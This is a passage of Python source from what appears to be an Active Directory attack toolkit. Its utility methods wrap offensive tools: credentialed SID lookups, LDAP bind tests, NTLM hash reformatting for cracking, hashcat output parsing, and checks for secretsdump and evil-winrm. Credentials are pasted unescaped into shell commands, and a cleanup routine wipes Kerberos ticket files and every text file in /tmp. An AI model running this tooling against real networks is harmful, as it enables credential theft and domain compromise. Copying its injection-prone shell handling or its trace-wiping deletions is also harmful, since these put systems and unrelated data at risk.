        self.results['smb_check'] = output
        return output

    def utility_get_domain_sid(self, target, domain, username, password):
        """Extract domain SID"""
        self.log(f"[*] Extracting domain SID from {target}")
        output = self.run_command(
            f"lookupsid.py {domain}/{username}:{password}@{target} 2>/dev/null | head -5",
            timeout=30
        )
        self.results['domain_sid'] = output
        return output

    def utility_get_dc_ip(self, domain):
        """Resolve domain controller IP"""
        self.log(f"[*] Resolving DC for {domain}")
        output = self.run_command(f"nslookup -type=SRV _ldap._tcp.{domain}", timeout=10)
        self.results['dc_ip'] = output
        return output

    def utility_test_ldap_bind(self, target, username="", password=""):
        """Test LDAP bind credentials"""
        self.log(f"[*] Testing LDAP bind on {target}")
        if username and password:
            output = self.run_command(
                f"ldapsearch -x -H ldap://{target} -D '{username}' -w '{password}' -b '' -s base namingContexts 2>&1 | head -10",
                timeout=15
            )
        else:
            output = self.run_command(
                f"ldapsearch -x -H ldap://{target} -b '' -s base namingContexts 2>&1 | head -10",
                timeout=15
            )
        self.results['ldap_bind_test'] = output
        return output

    def utility_convert_hash(self, ntlm_hash):
        """Convert NTLM hash format"""
        self.log("[*] Converting hash format")
        if ':' in ntlm_hash:
            parts = ntlm_hash.split(':')
            if len(parts) == 2:
                return f"NTLM: {parts[0]}:{parts[1]}\nHashcat: {parts[1]}\nJohn: {parts[0]}$${parts[1]}"
        return ntlm_hash

    def utility_decode_base64(self, encoded_string):
        """Decode base64 encoded string"""
        import base64
        try:
            decoded = base64.b64decode(encoded_string).decode('utf-8', errors='ignore')
            return decoded
        except Exception as e:
            return f"[!] Decode error: {str(e)}"

    def utility_generate_random_string(self, length=12):
        """Generate random alphanumeric string"""
        import random
        import string
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def utility_parse_hashcat_output(self, hashcat_output):
        """Parse hashcat output to extract cracked passwords"""
        self.log("[*] Parsing hashcat output")
        results = []
        for line in hashcat_output.split('\n'):
            if ':' in line and not line.startswith('[') and line.strip():
                results.append(line.strip())
        self.results['parsed_hashes'] = results
        return results

    def utility_export_results(self, output_file="ad_attack_results.json"):
        """Export all results to JSON file"""
        self.log(f"[*] Exporting results to {output_file}")
        export_data = {
            "results": self.results,
            "captures": self.get_all_captures(),
            "timestamp": datetime.now().isoformat()
        }
        try:
            with open(output_file, 'w') as f:
                json.dump(export_data, f, indent=2)
            return f"[+] Results exported to {output_file}"
        except Exception as e:
            return f"[!] Export error: {str(e)}"

    def utility_get_version(self):
        """Get module version and tool availability"""
        self.log("[*] Checking tool availability")
        tools = {
            'crackmapexec': self.run_command("which crackmapexec 2>/dev/null || echo 'not found'"),
            'impacket': self.run_command("which impacket-smbclient 2>/dev/null || echo 'not found'"),
            'smbclient': self.run_command("which smbclient 2>/dev/null || echo 'not found'"),
            'ldapsearch': self.run_command("which ldapsearch 2>/dev/null || echo 'not found'"),
            'enum4linux': self.run_command("which enum4linux 2>/dev/null || echo 'not found'"),
            'xfreerdp': self.run_command("which xfreerdp 2>/dev/null || echo 'not found'"),
            'evil-winrm': self.run_command("which evil-winrm 2>/dev/null || echo 'not found'"),
            'secretsdump': self.run_command("which secretsdump.py 2>/dev/null || echo 'not found'"),
        }
        return tools

    def cleanup_all(self):
        """Cleanup all temporary files"""
        self.log("[*] Cleaning up temporary files")
        output = self.run_command(
            "rm -f /tmp/*.kirbi /tmp/*.ccache /tmp/*.txt 2>/dev/null || echo 'Cleanup complete'"
        )
        self.clear_captures()
        self.results.clear()
        return "[+] Cleanup complete"
